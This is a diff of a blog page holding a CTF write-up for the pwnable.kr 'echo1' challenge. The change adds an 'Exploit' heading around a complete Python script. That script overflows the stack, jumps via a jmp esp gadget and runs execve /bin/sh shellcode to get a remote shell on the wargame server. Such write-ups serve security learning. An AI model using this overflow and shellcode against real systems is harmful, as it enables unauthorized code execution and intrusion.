@@ -85,18 +85,18 @@
 
 
 <meta name="description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
+Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target,">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.kr-rookiss-echo1">
 <meta property="og:url" content="http://0byjwzsf.me/2016/07/25/pwnable-rookiss-echo1/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
 <meta property="og:description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
-<meta property="og:updated_time" content="2016-08-19T07:34:45.000Z">
+Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target,">
+<meta property="og:updated_time" content="2016-08-24T13:29:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr-rookiss-echo1">
 <meta name="twitter:description" content="Trick没有开NX，又是简单的栈溢出，利用jmp esp来执行栈上的shellcode
-from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target, print_">
+Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./echo1&apos;target  = (&apos;pwnable.kr&apos;, 9010)io      = zio(target,">
 
 
 
@@ -366,7 +366,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
 
       
         <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -543,7 +543,7 @@ from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, 
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
             
           </div>
         </section>
